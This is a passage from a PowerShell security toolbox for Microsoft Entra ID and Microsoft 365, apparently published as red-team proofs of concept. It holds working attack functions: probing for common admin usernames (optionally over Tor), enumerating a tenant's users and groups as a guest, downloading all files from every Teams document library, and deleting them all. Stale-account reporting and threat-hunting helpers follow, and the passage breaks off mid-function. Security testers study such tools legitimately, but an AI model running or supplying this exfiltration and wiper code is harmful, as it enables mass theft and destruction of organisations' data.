    "guest@DOMAINNAME",
    "test@DOMAINNAME",
    "test1@DOMAINNAME",
    "test01@DOMAINNAME",
    "testing@DOMAINNAME",
    "test.test@DOMAINNAME",
    "test.testsson@DOMAINNAME",
    "demo@DOMAINNAME",
    "backup@DOMAINNAME",
    "print@DOMAINNAME",
    "sa@DOMAINNAME",
    "sql@DOMAINNAME",
    "mysql@DOMAINNAME",
    "oracle@DOMAINNAME"

    foreach ($Domain in $Domains) {
        if ($UseTorHttpProxy) {
            Test-DCEntraIDUserExistence -UseTorHttpProxy -Users ($CommonAdminUsernames -replace "DOMAINNAME", $Domain)
        }
        else {
            Test-DCEntraIDUserExistence -Users ($CommonAdminUsernames -replace "DOMAINNAME", $Domain)
        }
    }   
}



function Get-DCEntraIDUsersAndGroupsAsGuest {
    <#
        .SYNOPSIS
            This script lets a guest user enumerate users and security groups/teams when 'Guest user access restrictions' in Entra ID is set to the default configuration.
        
        .DESCRIPTION
            This script is a proof of concept. Don't use it for bad things! It lets a guest user enumerate users and security groups/teams when 'Guest user access restrictions' in Entra ID is set to the default configuration. It works around the limitation that guest users must do explicit lookups for users and groups. It basically produces a list of all users and groups in the tenant, even though such actions are blocked for guests by default.
            
            If the target tenant allows guest users to sign in with Entra ID PowerShell, and the 'Guest user access restrictions' is set to one of these two settings:
            'Guest users have the same access as members (most inclusive)'
            'Guest users have limited access to properties and memberships of directory objects' [default]

            And not set to:
            'Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)'

            ...then this script will query Entra ID for the group memberships of the specified -InterestingUsers that you already know the UPN of. It then perform nested queries until all users and groups have been found. It will stop after a maximum of 5 iterations to avoid throttling and infinite loops. "A friend of a friend of a friend..."

            Finally, the script will output one array with found users, and one array with found groups/teams. You can then export them to CSV or some other format of your choice. Export examples are outputed for your convenience.
        
        .PARAMETER TenantId
            The tenant ID of the target tenant where you are a guest. You can find all your guest tenant IDs here: https://portal.azure.com/#settings/directory

        .PARAMETER AccountId
            Your UPN in your home tenant (probably your email address, right?).

        .PARAMETER InterestingUsers
            One or more UPNs of users in the target tenant. These will serve as a starting point for the search, and one or two employees you know about is often sufficient to enumerate everything.
        
        .EXAMPLE
            Get-DCEntraIDUsersAndGroupsAsGuest -TenantId '00000000-0000-0000-0000-000000000000' -AccountId 'user@example.com' -InterestingUsers 'customer1@customer.com', 'customer2@customer.com'

        .INPUTS
            None

        .OUTPUTS
            One array with found users, and one array with found groups/teams.
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [string]$TenantId,

        [parameter(Mandatory = $true)]
        [string]$AccountId,

        [parameter(Mandatory = $true)]
        [string[]]$InterestingUsers
    )


    # Connect to the target tenant as a guest.
    Write-Verbose -Verbose -Message 'Connecting to Entra ID as guest...'
    Connect-AzureAd -TenantId $TenantId -AccountId $AccountId | Out-Null


    # Variables to collect.
    $global:FoundUsers = @()
    $global:FoundGroups = @()


    # First round.
    Write-Verbose -Verbose -Message 'Starting round 1...'
    $global:FoundUsers = foreach ($User in $InterestingUsers) {
        $FormatedUser = Get-AzureAdUser -ObjectId $User
        $Manager = Get-AzureAdUserManager -ObjectId $FormatedUser.ObjectId
        $FormatedUser | Add-Member -NotePropertyName 'ManagerDisplayName' -NotePropertyValue $Manager.DisplayName -Force
        $FormatedUser | Add-Member -NotePropertyName 'ManagerUpn' -NotePropertyValue $Manager.UserPrincipalName -Force
        $FormatedUser | Add-Member -NotePropertyName 'ManagerObjectId' -NotePropertyValue $Manager.ObjectId -Force
        $FormatedUser
    }

    $global:FoundUsers = @($global:FoundUsers | Select-Object -Unique | Sort-Object UserPrincipalName)
    Write-Verbose -Verbose -Message "Found $($global:FoundUsers.Count) users!"


    # Remaining rounds.
    for ($i = 2; $i -le 5; $i++) {
        Write-Verbose -Verbose -Message "Starting round $i..."

        foreach ($User in $global:FoundUsers) {
            $Groups = Get-AzureAdUserMembership -ObjectID $User.UserPrincipalName | Where-Object DisplayName -NE $null

            foreach ($Group in $Groups) {
                if ($global:FoundGroups.ObjectId) {
                    if (!($global:FoundGroups.ObjectId.Contains($Group.ObjectId))) {
                        Write-Verbose -Verbose -Message "Processing group '$($Group.DisplayName)'..."

                        $global:FoundGroups += $Group

                        $Members = @()

                        try {
                            $Members = Get-AzureAdGroupMember -All:$true -ObjectId $Group.ObjectId -ErrorAction SilentlyContinue
                        }
                        catch {
                            # Do nothing.
                        }

                        foreach ($Member in $Members) {
                            if (!($global:FoundUsers.ObjectId.Contains($Member.ObjectId))) {
                                $FormatedUser = Get-AzureAdUser -ObjectId $Member.ObjectId -ErrorAction SilentlyContinue
                                $Manager = Get-AzureAdUserManager -ObjectId $FormatedUser.ObjectId
                                $FormatedUser | Add-Member -NotePropertyName 'ManagerDisplayName' -NotePropertyValue $Manager.DisplayName -Force
                                $FormatedUser | Add-Member -NotePropertyName 'ManagerUpn' -NotePropertyValue $Manager.UserPrincipalName -Force
                                $FormatedUser | Add-Member -NotePropertyName 'ManagerObjectId' -NotePropertyValue $Manager.ObjectId -Force
                                $global:FoundUsers += $FormatedUser
                            }
                        }
                    }
                }
                else {
                    Write-Verbose -Verbose -Message "Processing group '$($Group.DisplayName)'..."
                    
                    $global:FoundGroups += $Group

                    $Members = @()

                    try {
                        $Members = Get-AzureAdGroupMember -All:$true -ObjectId $Group.ObjectId -ErrorAction SilentlyContinue
                    }
                    catch {
                        # Do nothing.
                    }

                    foreach ($Member in $Members) {
                        if (!($global:FoundUsers.ObjectId.Contains($Member.ObjectId))) {
                            $FormatedUser = Get-AzureAdUser -ObjectId $Member.ObjectId -ErrorAction SilentlyContinue
                            $Manager = Get-AzureAdUserManager -ObjectId $FormatedUser.ObjectId
                            $FormatedUser | Add-Member -NotePropertyName 'ManagerDisplayName' -NotePropertyValue $Manager.DisplayName -Force
                            $FormatedUser | Add-Member -NotePropertyName 'ManagerUpn' -NotePropertyValue $Manager.UserPrincipalName -Force
                            $FormatedUser | Add-Member -NotePropertyName 'ManagerObjectId' -NotePropertyValue $Manager.ObjectId -Force
                            $global:FoundUsers += $FormatedUser
                        }
                    }
                }
            }
        }

        # Remove duplicates.
        $global:FoundUsers = $global:FoundUsers | Select-Object -Unique | Sort-Object UserPrincipalName
        Write-Verbose -Verbose -Message "Found $($global:FoundUsers.Count) users!"
        $global:FoundGroups = $global:FoundGroups | Select-Object -Unique | Sort-Object DisplayName
        Write-Verbose -Verbose -Message "Found $($global:FoundGroups.Count) groups!"

        # Check if we found any new users or groups this round.
        if ($global:FoundUsers.Count -eq $LastRoundUsers -and $global:FoundGroups.Count -eq $LastRoundGroups) {
            Write-Verbose -Verbose -Message "No new users or groups found in this round! Breaking loop!"
            break
        }

        # Use this to check for new users and groups next round.
        $LastRoundUsers = $global:FoundUsers.Count
        $LastRoundGroups = $global:FoundGroups.Count
    }

    
    # Output instructions.
    Write-Host ''
    Write-Verbose -Verbose -Message "You now have two arrays with found users and groups:"
    Write-Host -ForegroundColor 'Green' '$FoundUsers | Format-Table ObjectId, UserPrincipalName, DisplayName, ManagerUpn, ManagerDisplayName'
    Write-Host -ForegroundColor 'Green' '$FoundGroups | Format-Table ObjectId, DisplayName, Description, SecurityEnabled'
    Write-Host ''
    Write-Verbose -Verbose -Message "You can export them to CSV like this:"
    Write-Host -ForegroundColor 'Green' "`$FoundUsers | Export-Csv -NoTypeInformation -Delimiter ';' -Encoding UTF8 -Path 'FoundUsers.csv'"
    Write-Host -ForegroundColor 'Green' "`$FoundGroups | Export-Csv -NoTypeInformation -Delimiter ';' -Encoding UTF8 -Path 'FoundGroups.csv'"
    Write-Host ''
}



function Invoke-DCM365DataExfiltration {
    <#
        .SYNOPSIS
            This script uses an Entra ID app registration to download all files from all M365 groups (Teams) document libraries in a tenant.
        
        .DESCRIPTION
            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!
            
            This script showcase how an attacker can exfiltrate huge amounts of files from a Microsoft 365 tenant, using a poorly protected Entra ID app registration with any of the following Microsoft Graph permissions:

            - Files.Read.All
            - Files.ReadWrite.All
            - Sites.Read.All
            - Sites.ReadWrite.All

            Also, one of the following permissions is required to enumerate M365 groups and SharePoint document libraries:

            - GroupMember.Read.All
            - Group.Read.All
            - Directory.Read.All
            - Group.ReadWrite.All
            - Directory.ReadWrite.All
        
            The script will loop through all M365 groups and their SharePoint Online document libraries (used by Microsoft Teams for storing files) and download all files it can find, down to three folder levels. The files will be downloaded to the current directory.
            
            A list of downloaded files will be copied to the clipboard after completion.

            You can run the script with -WhatIf to skip the actual downloads. It will still show the output and what would have been downloaded.
        
        .PARAMETER ClientID
            Client ID for your Entra ID application.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application.

        .PARAMETER TenantName
            The name of your tenant (example.onmicrosoft.com).
        
        .PARAMETER WhatIf
            Skip the actual downloads. It will still show the output and what would have been downloaded.
        
        .EXAMPLE
            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'

        .EXAMPLE
            Invoke-M365DataExfiltration -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com' -WhatIf

        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $true)]
        [string]$TenantName,

        [parameter(Mandatory = $false)]
        [switch]$WhatIf
    )


    # WhatIf.
    if ($WhatIf) {
        Write-Verbose -Verbose -Message "NOTE: -WhatIf was declared. Simulating run (no files will be downloaded)!"
    }


    # Connect to Microsoft Graph with application credentials.
    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph as Service Principal '$ClientID'..."
    $Parameters = @{
        ClientID = $ClientID
        ClientSecret = $ClientSecret
        TenantName = $TenantName
    }

    $AccessToken = Connect-DCMsGraphAsApplication @Parameters


    # GET all Microsoft 365 Groups.
    Write-Verbose -Verbose -Message "Fetching all Microsoft 365 groups (Teams)..."
    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri = "https://graph.microsoft.com/v1.0/groups?`$filter=groupTypes/any(c:c+eq+'Unified')&`$select=id,displayName,description"
    }

    $M365Groups = Invoke-DCMsGraphQuery @Parameters
    Write-Verbose -Verbose -Message "Found $($M365Groups.Count) Microsoft 365 groups."


    # GET all related SharePoint document libraries.
    Write-Verbose -Verbose -Message "Loading related SharePoint document libraries..."
    $DocumentLibraries = foreach ($Group in $M365Groups) {
        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/groups/$($Group.id)/drive?`$select=id,name,webUrl"
        }

        Invoke-DCMsGraphQuery @Parameters
    }
    Write-Verbose -Verbose -Message "Done! Starting download job NOW..."


    # DOWNLOAD files in the document libraries (root level + three folder levels down).
    $Files = foreach ($DocumentLibrary in $DocumentLibraries) {
        Write-Verbose -Verbose -Message "--- Looking in '$($DocumentLibrary.webUrl)'..."

        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/root/children"
        }

        $RootContent = Invoke-DCMsGraphQuery @Parameters
        $RootContent | where file

        # Download files in root directory.
        foreach ($File in ($RootContent | where file)) {
            Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

            $HeaderParams = @{
                'Content-Type'  = "application\json"
                'Authorization' = "Bearer $AccessToken"
            }

            if (!($WhatIf)) {
                Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
            }
        }

        foreach ($Item in ($RootContent | where folder)) {
            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'GET'
                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
            }

            $SubContentLevel1 = Invoke-DCMsGraphQuery @Parameters
            $SubContentLevel1 | where file
            
            # Download files in sub SubContentLevel1.
            foreach ($File in ($SubContentLevel1 | where file)) {
                Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                $HeaderParams = @{
                    'Content-Type'  = "application\json"
                    'Authorization' = "Bearer $AccessToken"
                }

                if (!($WhatIf)) {
                    Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                }
            }

            # Go through folders in SubContentLevel1.
            foreach ($Item in ($SubContentLevel1 | where folder)) {
                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'GET'
                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                }
        
                $SubContentLevel2 = Invoke-DCMsGraphQuery @Parameters
                $SubContentLevel2 | where file
                
                # Download files in sub SubContentLevel2.
                foreach ($File in ($SubContentLevel2 | where file)) {
                    Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                    $HeaderParams = @{
                        'Content-Type'  = "application\json"
                        'Authorization' = "Bearer $AccessToken"
                    }

                    if (!($WhatIf)) {
                        Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                    }
                }

                # Go through folders in SubContentLevel2.
                foreach ($Item in ($SubContentLevel2 | where folder)) {
                    $Parameters = @{
                        AccessToken = $AccessToken
                        GraphMethod = 'GET'
                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                    }
            
                    $SubContentLevel3 = Invoke-DCMsGraphQuery @Parameters
                    $SubContentLevel3 | where file
                    
                    # Download files in sub SubContentLevel3.
                    foreach ($File in ($SubContentLevel3 | where file)) {
                        Write-Verbose -Verbose -Message "------ Downloading '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                        $HeaderParams = @{
                            'Content-Type'  = "application\json"
                            'Authorization' = "Bearer $AccessToken"
                        }

                        if (!($WhatIf)) {
                            Invoke-RestMethod -Headers $HeaderParams -Uri $File."@microsoft.graph.downloadUrl" -UseBasicParsing -Method GET -ContentType "application/json" -OutFile $File.Name
                        }
                    }
                }
            }
        }
    }


    # Copy result to clipboard and exit.
    $Files | Select-Object Name,size | Set-Clipboard
    Write-Verbose -Verbose -Message "File list copied to clipboard!"
    Write-Verbose -Verbose -Message "All done!"
}



function Invoke-DCM365DataWiper {
    <#
        .SYNOPSIS
            This script uses an Entra ID app registration to wipe all files from all M365 groups (Teams) document libraries in a tenant.
        
        .DESCRIPTION
            This script is a proof of concept and for testing purposes only. Do not use this script in an unethical or unlawful way. Don’t be stupid!
            
            This script showcase how an attacker can wipe huge amounts of files from a Microsoft 365 tenant, using a poorly protected Entra ID app registration with any of the following Microsoft Graph permissions:

            - Files.ReadWrite.All
            - Sites.ReadWrite.All

            Also, one of the following permissions is required to enumerate M365 groups and SharePoint document libraries:

            - GroupMember.Read.All
            - Group.Read.All
            - Directory.Read.All
            - Group.ReadWrite.All
            - Directory.ReadWrite.All
        
            The script will loop through all M365 groups and their SharePoint Online document libraries (used by Microsoft Teams for storing files) and delete all files it can find, down to three folder levels. The files will be downloaded to the current directory.
            
            A list of downloaded files will be copied to the clipboard after completion.

            You can run the script with -WhatIf to skip the actual deletion. It will still show the output and what would have been deleted.
        
        .PARAMETER ClientID
            Client ID for your Entra ID application.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application.

        .PARAMETER TenantName
            The name of your tenant (example.onmicrosoft.com).
        
        .PARAMETER WhatIf
            Skip the actual deletion. It will still show the output and what would have been deleted.
        
        .EXAMPLE
            Invoke-DCM365DataWiper -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com'

        .EXAMPLE
            Invoke-DCM365DataWiper -ClientID '8a85d2cf-17c7-4ecd-a4ef-05b9a81a9bba' -ClientSecret 'j[BQNSi29Wj4od92ritl_DHJvl1sG.Y/' -TenantName 'example.onmicrosoft.com' -WhatIf

        .INPUTS
            None

        .OUTPUTS
            None
        
        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
	#>


    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $true)]
        [string]$TenantName,

        [parameter(Mandatory = $false)]
        [switch]$WhatIf
    )


    # WhatIf.
    if ($WhatIf) {
        Write-Verbose -Verbose -Message "NOTE: -WhatIf was declared. Simulating run (no files will be deleted)!"
    }


    # Connect to Microsoft Graph with application credentials.
    Write-Verbose -Verbose -Message "Connecting to Microsoft Graph as Service Principal '$ClientID'..."
    $Parameters = @{
        ClientID = $ClientID
        ClientSecret = $ClientSecret
        TenantName = $TenantName
    }

    $AccessToken = Connect-DCMsGraphAsApplication @Parameters


    # GET all Microsoft 365 Groups.
    Write-Verbose -Verbose -Message "Fetching all Microsoft 365 groups (Teams)..."
    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri = "https://graph.microsoft.com/v1.0/groups?`$filter=groupTypes/any(c:c+eq+'Unified')&`$select=id,displayName,description"
    }

    $M365Groups = Invoke-DCMsGraphQuery @Parameters
    Write-Verbose -Verbose -Message "Found $($M365Groups.Count) Microsoft 365 groups."


    # GET all related SharePoint document libraries.
    Write-Verbose -Verbose -Message "Loading related SharePoint document libraries..."
    $DocumentLibraries = foreach ($Group in $M365Groups) {
        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/groups/$($Group.id)/drive?`$select=id,name,webUrl"
        }

        Invoke-DCMsGraphQuery @Parameters
    }
    Write-Verbose -Verbose -Message "Done! Starting wipe job NOW..."


    # DELETE files in the document libraries (root level + three folder levels down).
    $Files = foreach ($DocumentLibrary in $DocumentLibraries) {
        Write-Verbose -Verbose -Message "--- Looking in '$($DocumentLibrary.webUrl)'..."

        $Parameters = @{
            AccessToken = $AccessToken
            GraphMethod = 'GET'
            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/root/children"
        }

        $RootContent = Invoke-DCMsGraphQuery @Parameters
        $RootContent | where file

        # Delete files in root directory.
        foreach ($File in ($RootContent | where file)) {
            Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'DELETE'
                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
            }
    
            if (!($WhatIf)) {
                $RootContent = Invoke-DCMsGraphQuery @Parameters
            }
        }

        foreach ($Item in ($RootContent | where folder)) {
            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'GET'
                GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
            }

            $SubContentLevel1 = Invoke-DCMsGraphQuery @Parameters
            $SubContentLevel1 | where file
            
            # Delete files in sub SubContentLevel1.
            foreach ($File in ($SubContentLevel1 | where file)) {
                Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'DELETE'
                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
                }
        
                if (!($WhatIf)) {
                    $RootContent = Invoke-DCMsGraphQuery @Parameters
                }
            }

            # Go through folders in SubContentLevel1.
            foreach ($Item in ($SubContentLevel1 | where folder)) {
                $Parameters = @{
                    AccessToken = $AccessToken
                    GraphMethod = 'GET'
                    GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                }
        
                $SubContentLevel2 = Invoke-DCMsGraphQuery @Parameters
                $SubContentLevel2 | where file
                
                # Delete files in sub SubContentLevel2.
                foreach ($File in ($SubContentLevel2 | where file)) {
                    Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                    $Parameters = @{
                        AccessToken = $AccessToken
                        GraphMethod = 'DELETE'
                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
                    }
            
                    if (!($WhatIf)) {
                        $RootContent = Invoke-DCMsGraphQuery @Parameters
                    }
                }

                # Go through folders in SubContentLevel2.
                foreach ($Item in ($SubContentLevel2 | where folder)) {
                    $Parameters = @{
                        AccessToken = $AccessToken
                        GraphMethod = 'GET'
                        GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($Item.id)/children"
                    }
            
                    $SubContentLevel3 = Invoke-DCMsGraphQuery @Parameters
                    $SubContentLevel3 | where file
                    
                    # Delete files in sub SubContentLevel3.
                    foreach ($File in ($SubContentLevel3 | where file)) {
                        Write-Verbose -Verbose -Message "------ Deleting '$($File.Name)' ($([math]::round($File.Size/1MB, 2)) MB)..."

                        $Parameters = @{
                            AccessToken = $AccessToken
                            GraphMethod = 'DELETE'
                            GraphUri = "https://graph.microsoft.com/v1.0/drives/$($DocumentLibrary.id)/items/$($File.id)"
                        }
                
                        if (!($WhatIf)) {
                            $RootContent = Invoke-DCMsGraphQuery @Parameters
                        }
                    }
                }
            }
        }
    }


    # Copy result to clipboard and exit.
    $Files | Select-Object Name,size | Set-Clipboard
    Write-Verbose -Verbose -Message "File list copied to clipboard!"
    Write-Verbose -Verbose -Message "All done!"
}



function Invoke-DCHuntingQuery {
    <#
        .SYNOPSIS
            Connect to Microsoft Graph with the Microsoft Graph PowerShell module and run a KQL hunting query in Microsoft 365 Defender.

        .DESCRIPTION
            Connect to Microsoft Graph with the Microsoft Graph PowerShell module and run a KQL hunting query in Microsoft 365 Defender.

        .PARAMETER Query
            The KQL query you want to run in Microsoft 365 Defender.

        .PARAMETER IncludeQueryAtTop
            Include the KQL query before the actual result output.

        .PARAMETER IncludeRaw
            Include the raw formated and escaped KQL query sent to Microsoft Graph.

        .INPUTS
            None

        .OUTPUTS
            None

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $Query = @'
            DeviceEvents
            | where ActionType startswith "Asr"
            | summarize count() by ActionType
            | order by count_
            '@

            Invoke-DCHuntingQuery -Query $Query

        .EXAMPLE
            $Query = @'
            DeviceEvents
            | where ActionType startswith "Asr"
            | summarize count() by ActionType
            | order by count_
            '@

            Invoke-DCHuntingQuery -Query $Query -IncludeKQLQueryAtTop
    #>



    # ----- [Initialisations] -----

    # Script parameters.
    [CmdletBinding()]
    param (
        [parameter(Mandatory = $true)]
        [string]$Query,

        [parameter(Mandatory = $false)]
        [switch]$IncludeKQLQueryAtTop,

        [parameter(Mandatory = $false)]
        [switch]$IncludeRaw
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Check PowerShell version.
    Confirm-DCPowerShellVersion


    # Check Microsoft Graph PowerShell module.
    Install-DCMicrosoftGraphPowerShellModule


    # Connect to Microsoft Graph.
    Connect-DCMsGraphAsUser -Scopes 'ThreatHunting.Read.All'


    if ($IncludeKQLQueryAtTop) {
        Write-Host ''
        Write-Host -ForegroundColor Cyan $Query
        Write-Host ''
    }


    # Run KQL hunting query.
    $Query = $Query -replace "\\", '\\' -replace '"', '\"'

    $GraphBody = @"
{
    "Query": "$Query"
}
"@

    if ($IncludeRaw) {
        Write-Host ''
        Write-Host -ForegroundColor Magenta $Query
        Write-Host ''
    }

    $Results = Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/security/runHuntingQuery' -Body $GraphBody -OutputType Json

    $Results = ($Results | ConvertFrom-Json).results

    $Properties = @(($Results | Select-Object -First 1).PSObject.Properties | Where-Object { $_.Name -notlike "*@odata.type"}).Name

    $CountIsPresent = $false

    [string[]]$Properties = foreach ($Property in $Properties) {
        if ($Property -eq 'count_') {
            $CountIsPresent = $true
        } else {
            $Property
        }
    }

    if ($CountIsPresent) {
        $Properties += "count_"
    }

    $Results | Select-Object -Property $Properties

    if (!($Results)) {
        Write-host '-- empty result --'
        Write-host ''
    }
}



function New-DCEntraIDStaleAccountReport {
    <#
        .SYNOPSIS
            Automatically generate an Excel report containing all stale Entra ID accounts.

        .DESCRIPTION
            Uses Microsoft Graph to fetch all Entra ID users who has not signed in for a specific number of days, and exports an Excel report. Some users might not have a last sign-in timestamp at all (maybe they didn't sign in or maybe they signed in a very long time ago), but they are still included in the report.

            Before running this CMDlet, you first need to register a new application in your Entra ID according to this article:
            https://danielchronlund.com/2018/11/19/fetch-data-from-microsoft-graph-with-powershell-paging-support/

            The following Microsoft Graph API permissions are required for this script to work:
                Directory.Read.All
                AuditLog.Read.All
            
            The CMDlet also uses the PowerShell Excel Module for the export to Excel. You can install this module with:
            Install-Module ImportExcel -Force
            
            Also, the user running this CMDlet (the one who signs in when the authentication pops up) must have the appropriate permissions in Entra ID (Global Admin, Global Reader, Security Admin, Security Reader, etc).
            
        .PARAMETER ClientID
            Client ID for the Entra ID application with Microsoft Graph permissions.

        .PARAMETER ClientSecret
            Client secret for the Entra ID application with Microsoft Graph permissions.

        .PARAMETER LastSeenDaysAgo
            Specify the number of days ago the account was last seen. Note that you can only see as long as your Entra ID sign-in logs reach (30 days by default).

        .PARAMETER OnlyMembers
            Only include member accounts (no guest accounts) in the report.

        .PARAMETER OnlyGuests
            Only include guest accounts (no member accounts) in the report.

        .PARAMETER IncludeMemberOf
            Add a column with all group/teams memberships.

        .INPUTS
            None

        .OUTPUTS
            Excel report with all stale Entra ID accounts.

        .NOTES
            Author:   Daniel Chronlund
            GitHub:   https://github.com/DanielChronlund/DCToolbox
            Blog:     https://danielchronlund.com/
        
        .EXAMPLE
            $Parameters = @{
                ClientID = ''
                ClientSecret = ''
                LastSeenDaysAgo = 30
            }

            New-DCEntraIDStaleAccountReport @Parameters


            $Parameters = @{
                ClientID = ''
                ClientSecret = ''
                LastSeenDaysAgo = 10
                OnlyGuests = $true
                IncludeMemberOf = $true
            }
            New-DCEntraIDStaleAccountReport @Parameters
    #>



    # ----- [Initializations] -----

    # Script parameters.
    param (
        [parameter(Mandatory = $true)]
        [string]$ClientID,

        [parameter(Mandatory = $true)]
        [string]$ClientSecret,

        [parameter(Mandatory = $false)]
        [int]$LastSeenDaysAgo = 30,

        [parameter(Mandatory = $false)]
        [switch]$OnlyMembers,

        [parameter(Mandatory = $false)]
        [switch]$OnlyGuests,

        [parameter(Mandatory = $false)]
        [switch]$IncludeMemberOf
    )


    # Set Error Action - Possible choices: Stop, SilentlyContinue
    $ErrorActionPreference = "Stop"



    # ----- [Execution] -----

    # Connect to Microsoft Graph with delegated credentials.
    $Parameters = @{
        ClientID = $ClientID
        ClientSecret = $ClientSecret
    }

    $AccessToken = Connect-DCMsGraphAsDelegated @Parameters


    # GET data.
    $GraphUri = ''

    if ($OnlyMembers) {
        $GraphUri = "https://graph.microsoft.com/beta/users?select=displayName,userPrincipalName,userType,accountEnabled,onPremisesSyncEnabled,companyName,department,country,signInActivity,assignedLicenses&`$filter=userType eq 'Member'"
    } elseif ($OnlyGuests) {
        $GraphUri = "https://graph.microsoft.com/beta/users?select=displayName,userPrincipalName,userType,accountEnabled,onPremisesSyncEnabled,companyName,department,country,signInActivity,assignedLicenses&`$filter=userType eq 'Guest'"
    } else {
        $GraphUri = "https://graph.microsoft.com/beta/users?select=displayName,userPrincipalName,userType,accountEnabled,onPremisesSyncEnabled,companyName,department,country,signInActivity,assignedLicenses"
    }

    $Parameters = @{
        AccessToken = $AccessToken
        GraphMethod = 'GET'
        GraphUri = $GraphUri
    }

    $Result = Invoke-DCMsGraphQuery @Parameters


    # Format the result.
    $Result2 = foreach ($User in $Result) {
        # Compare sign in date against non-interactive sign-in date.
        try {
            $lastSignInDateTime = Get-Date -Date $User.signInActivity.lastSignInDateTime
        } catch {
            $lastSignInDateTime = $null
        }

        try {
            $lastNonInteractiveSignInDateTime = Get-Date -Date $User.signInActivity.lastNonInteractiveSignInDateTime
        } catch {
            $lastNonInteractiveSignInDateTime = $null
        }

        $LastSignInActivity = Get-Date
        
        if ($lastNonInteractiveSignInDateTime -gt $lastSignInDateTime) {
            $LastSignInActivity = $lastNonInteractiveSignInDateTime
        } else {
            $LastSignInActivity = $lastSignInDateTime
        }


        # Include group membership (might be slow).
        $MemberOf = ""

        if ($IncludeMemberOf) {
            $GraphUri = "https://graph.microsoft.com/beta/users/$($User.id)/memberOf"

            $Parameters = @{
                AccessToken = $AccessToken
                GraphMethod = 'GET'
                GraphUri = $GraphUri
            }
            
            $Groups = Invoke-DCMsGraphQuery @Parameters

            $MemberOf = foreach ($Group in $Groups) {
